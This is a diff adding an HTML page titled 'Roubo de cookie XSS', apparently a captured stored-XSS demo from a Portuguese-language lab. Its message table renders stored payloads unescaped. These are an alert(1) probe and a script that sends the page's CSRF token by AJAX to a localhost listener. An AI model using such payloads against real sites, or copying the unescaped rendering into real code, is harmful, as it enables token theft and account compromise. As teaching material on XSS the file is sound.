@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <title>Roubo de cookie XSS</title>
+  </head>
+  
+  <body>
+    <!-- Input form -->
+    <form method="POST">
+      <input type="hidden" name="csrfmiddlewaretoken" value="mnBwwLZ22T0tiOhH8BBXuNP2SdzalKEdML0rTImclHXFxvmFpl0S9cAsv8cyqYLp">
+      <p>
+    <label for="id_name">Name:</label>
+    <input type="text" name="name" maxlength="40" required id="id_name">
+    
+    
+  </p>
+
+  
+  <p>
+    <label for="id_email">Email:</label>
+    <input type="email" name="email" maxlength="254" required id="id_email">
+    
+    
+  </p>
+
+  
+  <p>
+    <label for="id_msg">Msg:</label>
+    <textarea name="msg" cols="40" rows="10" required id="id_msg">
+</textarea>
+    
+    
+      
+    
+  </p>
+      <button type="submit">Enviar sua mensagem</button>
+    </form>
+      
+    <br><br>
+
+    <!-- Output table -->
+    <table>
+      <thead>
+        <tr>
+          <th>Nome</th>
+          <th>E-mail</th>
+          <th>Mensagem</th>
+        </tr>
+      </thead>
+      <tbody>
+        
+        <tr>
+          <td>teste</td>
+          <td>teste@teste.com.br</td>
+          <td><script>alert(1)</script></td>
+        </tr>
+        
+        <tr>
+          <td>teste</td>
+          <td>teste@teste.com.br</td>
+          <td><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script>
+        $.ajax({
+            url: "http://localhost:80",
+            method: 'GET',
+            data: {
+                'csrfmiddlewaretoken': document.getElementsByName('csrfmiddlewaretoken')[0].value
+            }
+        });
+    </script></td>
+        </tr>
+        
+      </tbody>
+    </table>
+  </body>
+</html>
